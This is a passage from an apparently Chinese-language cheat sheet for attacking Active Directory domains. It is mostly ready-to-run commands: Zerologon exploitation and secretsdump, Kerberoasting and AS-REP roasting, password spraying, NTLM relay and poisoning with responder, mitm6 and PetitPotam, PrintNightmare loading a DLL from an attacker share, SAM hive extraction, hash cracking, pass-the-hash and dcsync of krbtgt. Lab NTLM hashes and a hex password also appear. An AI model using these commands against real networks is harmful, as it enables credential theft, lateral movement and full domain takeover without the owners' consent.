<li>[域渗透——Pass The Ticket](<a href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass">https://www.feiworks.com/wy/drops/域渗透——Pass</a> The Ticket.pdf)</li>
</ul>
<h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理 <a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q */*</span><br></pre></td></tr></table></figure>

<p>从Mimikatz的RAM中提取获得的门票</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>用rgsrepcrack破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>

<h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码</p>
<h5 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h5><ul>
<li><a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></li>
<li><a href="https://github.com/dirkjanm/privexchange/">privexchange</a></li>
<li><a href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li>
</ul>
<p>用于主动让目标机器发起NTLM请求的方法：</p>
<ul>
<li><a href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></li>
<li><a href="https://github.com/topotam/PetitPotam">PetitPotam</a></li>
</ul>
<p>Relay LDAP:</p>
<ul>
<li><a href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></li>
</ul>
<p>Relay AD CS/PKI:</p>
<ul>
<li><a href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit</a></li>
</ul>
<p>集成几个利用的工具：</p>
<ul>
<li><a href="https://github.com/Ridter/Relayx">Relayx</a></li>
</ul>
<p>内网445端口转发：</p>
<ul>
<li><a href="https://github.com/praetorian-inc/PortBender">PortBender</a></li>
</ul>
<h5 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h5><ul>
<li><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></li>
<li><a href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></li>
<li><a href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li>
<li><a href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></li>
<li><a href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></li>
<li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></li>
<li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></li>
</ul>
<h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP</p>
<h5 id="zerologon漏洞"><a href="#zerologon漏洞" class="headerlink" title="zerologon漏洞"></a>zerologon漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">secretsdump.py &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user &quot;Administrator&quot; </span><br><span class="line"></span><br><span class="line">secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;/Administrator@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line">python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;/&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></p>
<p>**1、利用Mimikatz **check</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon /target:dc1.exploit.local /account:dc1$</span><br></pre></td></tr></table></figure>

<p><strong>exploit</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit</span><br></pre></td></tr></table></figure>

<p><strong>dcsync</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:&quot;&quot; /domain:exploit.local /authntlm /user:krbtgt</span><br></pre></td></tr></table></figure>

<p><strong>restore</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::postzerologon /target:conttosson.locl /account:dc$ </span><br></pre></td></tr></table></figure>

<p><strong>2、利用impacket：</strong></p>
<ul>
<li>取目标主机名+IP</li>
<li>install 修改版本的impacket</li>
<li>Exp</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span><br></pre></td></tr></table></figure>

<p><a href="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67"><img src="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67" alt="img"></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/<span class="string">&#x27;DC2008$&#x27;</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -history -just-dc-user administrator</span><br><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/administrator@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span><br></pre></td></tr></table></figure>

<p><a href="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67"><img src="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67" alt="img"></a></p>
<p>获取到旧的密码明文hex，还原</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span><br></pre></td></tr></table></figure>

<p><a href="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67"><img src="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67" alt="img"></a></p>
<p>恢复方法2</p>
<p> 通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38</span><br></pre></td></tr></table></figure>

<p>然后分别执行,拷贝本机中SAM数据库到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- reg save HKLM\SYSTEM system.save</span><br><span class="line">- reg save HKLM\SAM sam.save</span><br><span class="line">- reg save HKLM\SECURITY security.save</span><br><span class="line">- get system.save</span><br><span class="line">- get sam.save</span><br><span class="line">- get security.save</span><br><span class="line">- del /f system.save</span><br><span class="line">- del /f sam.save</span><br><span class="line">- del /f security.save</span><br></pre></td></tr></table></figure>

<p>提取明文hash</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>

<p>然后恢复。</p>
<h5 id="CVE-2021-42278-amp-amp-CVE-2021-42287"><a href="#CVE-2021-42278-amp-amp-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp;&amp; CVE-2021-42287"></a>CVE-2021-42278 &amp;&amp; CVE-2021-42287</h5><p><a href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a></p>
<p><a href="https://github.com/cube0x0/noPac">noPac: CVE-2021-42287/CVE-2021-42278</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./noPac.exe -domain dc.com -user username -pass &#x27;password&#x27; /dc owa.dc.com</span><br><span class="line">/mAccount mAusername /mPassword password /service cifs /ptt</span><br></pre></td></tr></table></figure>





<h1 id="4-列出可匿名访问的SMB共享"><a href="#4-列出可匿名访问的SMB共享" class="headerlink" title="4.列出可匿名访问的SMB共享"></a>4.列出可匿名访问的SMB共享</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbclient -U &#x27;%&#x27; -L //&lt;dc-ip&gt; &amp;&amp; smbclient -U &#x27;guest%&#x27; -L //&lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;&#x27; -p &#x27;&#x27; # 枚举可空Session访问的SMB共享</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#x27;a&#x27; -p &#x27;&#x27; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure>



<h1 id="5-枚举LDAP"><a href="#5-枚举LDAP" class="headerlink" title="5.枚举LDAP"></a>5.枚举LDAP</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;ip&gt; -s base  </span><br></pre></td></tr></table></figure>



<h1 id="6-查找用户名"><a href="#6-查找用户名" class="headerlink" title="6.查找用户名"></a>6.查找用户名</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -U &lt;dc-ip&gt; | grep &#x27;user:&#x27;</span><br><span class="line"></span><br><span class="line">crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#x27;&lt;password&gt;&#x27; --users </span><br><span class="line"></span><br><span class="line">nmap -p 88 --script=krb5-enum-users --script-args=&quot;krb5-enum-users.realm=&#x27;&lt;domain&gt;&#x27;,userdb=&lt;users_list_file&gt;&quot; &lt;ip&gt; </span><br><span class="line"></span><br><span class="line">OSINT - 在互联网上寻找用户名</span><br></pre></td></tr></table></figure>



<h2 id="得到账号，但是没有密码"><a href="#得到账号，但是没有密码" class="headerlink" title="得到账号，但是没有密码"></a>得到账号，但是没有密码</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取域密码策略 ：</span><br><span class="line">crackmapexec &lt;IP&gt; -u &#x27;user&#x27; -p &#x27;password&#x27; --pass-pol</span><br><span class="line">enum4linx -u &#x27;username&#x27; -p &#x27;password&#x27; -P &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # 不爆破，只测试单一的 user=password</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # 交叉爆破，根据密码策略，失败过多可能会被封禁</span><br></pre></td></tr></table></figure>



<h3 id="ASREP-Roasting攻击"><a href="#ASREP-Roasting攻击" class="headerlink" title="ASREP-Roasting攻击"></a>ASREP-Roasting攻击</h3><h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line"></span><br><span class="line">Rubeus asreproast /format:hashcat</span><br></pre></td></tr></table></figure>



<h4 id="获取ASREP-Roastable账号"><a href="#获取ASREP-Roastable账号" class="headerlink" title="获取ASREP-Roastable账号"></a>获取ASREP-Roastable账号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired -Properties SamAccountName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h2 id="拿到任意一个域用户的账号密码"><a href="#拿到任意一个域用户的账号密码" class="headerlink" title="拿到任意一个域用户的账号密码"></a>拿到任意一个域用户的账号密码</h2><h3 id="获取其他账户密码"><a href="#获取其他账户密码" class="headerlink" title="获取其他账户密码"></a>获取其他账户密码</h3><h4 id="1-获取域内所有账户名"><a href="#1-获取域内所有账户名" class="headerlink" title="1.获取域内所有账户名"></a>1.获取域内所有账户名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-枚举-SMB-共享"><a href="#2-枚举-SMB-共享" class="headerlink" title="2.枚举 SMB 共享"></a>2.枚举 SMB 共享</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</span><br></pre></td></tr></table></figure>

<h4 id="3-bloodhound"><a href="#3-bloodhound" class="headerlink" title="3.bloodhound"></a>3.bloodhound</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</span><br></pre></td></tr></table></figure>

<h4 id="4-powerview-pywerview"><a href="#4-powerview-pywerview" class="headerlink" title="4.powerview / pywerview"></a>4.powerview / pywerview</h4><h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h3><h4 id="获取hash-1"><a href="#获取hash-1" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;</span><br><span class="line"></span><br><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure>



<h4 id="查找-kerberoastable-账号"><a href="#查找-kerberoastable-账号" class="headerlink" title="查找 kerberoastable 账号"></a>查找 kerberoastable 账号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;) RETURN u</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>FindSMB2UPTime.py <ip></ip></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames &lt;name&gt;</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;user&gt;:&#x27;&lt;password&gt;&#x27;@&lt;target&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptc &quot;&lt;ticket&gt;&quot;</span><br></pre></td></tr></table></figure>



<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2021-1675.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;target&gt; &#x27;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#x27;</span><br></pre></td></tr></table></figure>



<h3 id="枚举-DNS-服务器"><a href="#枚举-DNS-服务器" class="headerlink" title="枚举 DNS 服务器"></a>枚举 DNS 服务器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnstool.py -u &#x27;DOMAIN\user&#x27; -p &#x27;password&#x27; --record &#x27;*&#x27; --action query &lt;dc_ip&gt;</span><br></pre></td></tr></table></figure>







<h1 id="7-relay-poisoning攻击"><a href="#7-relay-poisoning攻击" class="headerlink" title="7.relay/poisoning攻击"></a>7.relay/poisoning攻击</h1><h3 id="扫描没开启SMB签名的机器"><a href="#扫描没开启SMB签名的机器" class="headerlink" title="扫描没开启SMB签名的机器"></a>扫描没开启SMB签名的机器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line"></span><br><span class="line">cme smb $hosts --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure>

<h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PetitPotam.py  -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>

<p>后续可以跟着adcs攻击</p>
<h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -i eth0</span><br><span class="line">mitm6 -d &lt;domain&gt;</span><br></pre></td></tr></table></figure>



<h2 id="无SMB签名-开启IPv6-ADCS"><a href="#无SMB签名-开启IPv6-ADCS" class="headerlink" title="无SMB签名 || 开启IPv6 || ADCS"></a>无SMB签名 || 开启IPv6 || ADCS</h2><h3 id="1-MS08-068"><a href="#1-MS08-068" class="headerlink" title="1.MS08-068"></a>1.MS08-068</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/smb_relay 	#常用于windows2003 / windows server2008</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -I eth0 # 记得先关闭本机的 smb 和 http 服务</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt </span><br></pre></td></tr></table></figure>



<h3 id="2-mitm6-i-eth0-d"><a href="#2-mitm6-i-eth0-d" class="headerlink" title="2.mitm6 -i eth0 -d "></a>2.mitm6 -i eth0 -d <domain></domain></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -l /tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb://&lt;target&gt; -l /tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldaps://&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access</span><br><span class="line"></span><br><span class="line">getST.py -spn cifs/&lt;target&gt; &lt;domain&gt;/&lt;netbios_name&gt;\$ -impersonate &lt;user&gt;</span><br></pre></td></tr></table></figure>



<h3 id="3-adcs"><a href="#3-adcs" class="headerlink" title="3.adcs"></a>3.adcs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t http://&lt;dc_ip&gt;/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Rubeus.exe asktgt /user:&lt;user&gt; /certificate:&lt;base64-certificate&gt; /ptt</span><br></pre></td></tr></table></figure>



<h2 id="拿到hash破解"><a href="#拿到hash破解" class="headerlink" title="拿到hash破解"></a>拿到hash破解</h2><h4 id="1-LM"><a href="#1-LM" class="headerlink" title="1.LM"></a>1.LM</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --format=lm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>



<h4 id="2-NTLM"><a href="#2-NTLM" class="headerlink" title="2.NTLM"></a>2.NTLM</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --format=nt hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>



<h4 id="3-NTLMv1"><a href="#3-NTLMv1" class="headerlink" title="3.NTLMv1"></a>3.NTLMv1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --format=netntlm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5500 -a 3 hash.txt</span><br></pre></td></tr></table></figure>

<h4 id="4-NTLMv2"><a href="#4-NTLMv2" class="headerlink" title="4.NTLMv2"></a>4.NTLMv2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --format=netntlmv2 hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<h4 id="5-Kerberos-5-TGS"><a href="#5-Kerberos-5-TGS" class="headerlink" title="5.Kerberos 5 TGS"></a>5.Kerberos 5 TGS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john spn.txt --format=krb5tgs --wordlist=rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 13100 -a 0 spn.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<h4 id="6-Kerberos-ASREP"><a href="#6-Kerberos-ASREP" class="headerlink" title="6.Kerberos ASREP"></a>6.Kerberos ASREP</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt</span><br></pre></td></tr></table></figure>



<h1 id="9-横向移动"><a href="#9-横向移动" class="headerlink" title="9.横向移动"></a>9.横向移动</h1><h2 id="1-PTH"><a href="#1-PTH" class="headerlink" title="1.PTH"></a>1.PTH</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;</span><br><span class="line"></span><br><span class="line">evil-winrm -i &lt;ip&gt;/&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;ip&gt;</span><br></pre></td></tr></table></figure>



<h2 id="2-PTK"><a href="#2-PTK" class="headerlink" title="2.PTK"></a>2.PTK</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getTGT.py &lt;domain&gt;/&lt;user&gt; -hashes :&lt;hashes&gt;</span><br><span class="line">export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache</span><br><span class="line">python psexec.py &lt;domain&gt;/&lt;user&gt;@&lt;ip&gt; -k -no-pass</span><br><span class="line"></span><br><span class="line">Rubeus asktgt /user:victim /rc4:&lt;rc4value&gt;</span><br><span class="line">Rubeus ptt /ticket:&lt;ticket&gt;</span><br><span class="line">Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]</span><br><span class="line">Rubeus ptt /luid:0xdeadbeef /ticket:&lt;ticket&gt;</span><br></pre></td></tr></table></figure>



<h2 id="3-非约束委派"><a href="#3-非约束委派" class="headerlink" title="3.非约束委派"></a>3.非约束委派</h2><h3 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export</span><br><span class="line"></span><br><span class="line">Rubeus dump /service:krbtgt /nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump /luid:0xdeadbeef /nowrap</span><br></pre></td></tr></table></figure>



<h3 id="查找非约束委派主机"><a href="#查找非约束委派主机" class="headerlink" title="查找非约束委派主机"></a>查找非约束委派主机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -Unconstrained -Properties DnsHostName</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;unconstraineddelegation:true&#125;), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h2 id="4-约束委派"><a href="#4-约束委派" class="headerlink" title="4.约束委派"></a>4.约束委派</h2><h3 id="获取票据-1"><a href="#获取票据-1" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets /export sekurlsa::tickets /</span><br><span class="line"></span><br><span class="line">Rubeus dump /service:krbtgt /nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump /luid:0xdeadbeef /nowrap</span><br></pre></td></tr></table></figure>



<h3 id="查找约束委派主机"><a href="#查找约束委派主机" class="headerlink" title="查找约束委派主机"></a>查找约束委派主机</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;name: &quot;&lt;MYTARGET.FQDN&gt;&quot;&#125;), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h2 id="5-基于资源的约束委派"><a href="#5-基于资源的约束委派" class="headerlink" title="5.基于资源的约束委派"></a>5.基于资源的约束委派</h2><h2 id="6-dcsync"><a href="#6-dcsync" class="headerlink" title="6.dcsync"></a>6.dcsync</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync /domain:htb.local /user:krbtgt # Administrators, Domain Admins, Enterprise Admins  组下的账户都行</span><br></pre></td></tr></table></figure>



<h2 id="7-打印机-SpoolService-漏洞利用"><a href="#7-打印机-SpoolService-漏洞利用" class="headerlink" title="7.打印机 SpoolService 漏洞利用"></a>7.打印机 SpoolService 漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcdump.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN</span><br><span class="line">printerbug.py &#x27;&lt;domain&gt;/&lt;username&gt;:&lt;password&gt;&#x27;@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;</span><br></pre></td></tr></table></figure>



